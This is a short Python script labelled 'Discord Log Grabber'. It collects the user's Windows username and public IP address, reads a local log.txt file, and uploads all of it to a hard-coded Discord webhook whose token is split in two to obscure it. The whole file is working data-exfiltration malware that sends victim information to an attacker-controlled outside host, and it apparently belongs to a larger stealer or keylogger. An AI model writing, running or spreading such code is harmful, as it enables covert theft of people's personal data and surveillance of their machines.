from urllib.request import Request, urlopen
import discord
import os

def GetIP():
    ip = "Can't get IP"
    try:
        ip = urlopen(Request("https://api.ipify.org?format=text")).read().decode().strip()
    except:
        pass
    return ip.replace("\"", "")

key1 = 'lugFSW4hwV3IW_paEralWMf0SIbxBU'
key2 = '3FroEB4uupuRYBIHVSgeZNI9qMlxza-unK5seB'
webhook = discord.Webhook.partial(931706518695473222, key1 + key2, adapter=discord.RequestsWebhookAdapter())

with open(file='log.txt', mode='rb') as f:
    discord_file = discord.File(f)

webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
